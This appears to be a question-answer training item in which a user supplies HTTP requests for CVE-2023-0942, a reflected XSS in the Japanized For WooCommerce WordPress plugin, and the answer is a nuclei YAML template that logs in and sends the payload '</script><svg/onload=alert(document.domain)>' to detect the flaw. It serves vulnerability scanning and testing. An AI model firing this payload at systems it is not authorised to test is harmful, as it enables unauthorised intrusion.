QUESTION: Please read the following HTTP request according to the operation documentation of the nuclei tool:

```HTTP
POST /wp-login.php HTTP/1.1
Host: 192.168.1.102
Content-Type: application/x-www-form-urlencoded

log=admin&pwd=123456&wp-submit=Log+In

GET /wp-admin/admin.php?page=wc4jp-options&tab=a</script><svg/onload=alert(document.domain)> HTTP/1.1
Host: 192.168.1.102
```

    The HTTP response is as follows:
```HTTP
HTTP/1.1 200 OK
Date: Thu, 13 Apr 2023 02:07:49 GMT
Connection: close
Content-Length: 124
    
<html>
    <header>test</header>
    <body>
        <svg/onload=alert(document.domain)>
    </body>
</html>
```

    The HTTP response need HTTP status 200 OK,and Response body contains string "<svg/onload=alert(document.domain)>" or "woocommerce-for-japan".
    
    The above request response is the xss(Cross Site Scripting) vulnerability of the Japanized For WooCommerce system that is less than version 2.5.5. The author of the discovery is r3Y3r53, and the cve number is CVE-2023-0942. matchers need choose dsl type,condition parameter is 'and'. Don't generate too many explanations for me, I only need the complete yaml code.CWE id is CWE-79. Severity level is medium. Need to verify metadata.Also need to convert the username parameter and password parameter into variables.
=========
ANSWER: 

```yaml
id: CVE-2023-0942-poc

info:
  name: Japanized For WooCommerce < 2.5.5 - Cross Site Scripting
  author: r3Y3r53
  severity: medium
  description: |
    Japanized For WooCommerce < 2.5.5 is vulnerable to Reflected Cross-Site Scripting via the tab parameter in versions up to, and including, 2.5.4 due to insufficient input sanitization and output escaping.
  reference:
    - https://wpscan.com/vulnerability/71aa9460-6dea-49cc-946c-d7d4bf723511
    - https://nvd.nist.gov/vuln/detail/CVE-2023-0942
    - https://wordpress.org/plugins/woocommerce-for-japan/
    - https://plugins.trac.wordpress.org/browser/woocommerce-for-japan/trunk/includes/admin/views/html-admin-setting-screen.php#L63
  remediation: Fixed in version 2.5.5
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2023-0942
    cwe-id: CWE-79
  metadata:
    verified: "true"
  tags: cve2023,woocommerce-for-japan,wp,wpscan,wordpress,authenticated,cve,xss,woocommerce,plugin

requests:
  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        log={{username}}&pwd={{password}}&wp-submit=Log+In
      - |
        GET /wp-admin/admin.php?page=wc4jp-options&tab=a</script><svg/onload=alert(document.domain)> HTTP/1.1
        Host: {{Hostname}}
    cookie-reuse: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code_2 == 200'
          - 'contains(body_2, "<svg/onload=alert(document.domain)>") && contains(body_2, "woocommerce-for-japan")'
        condition: and
```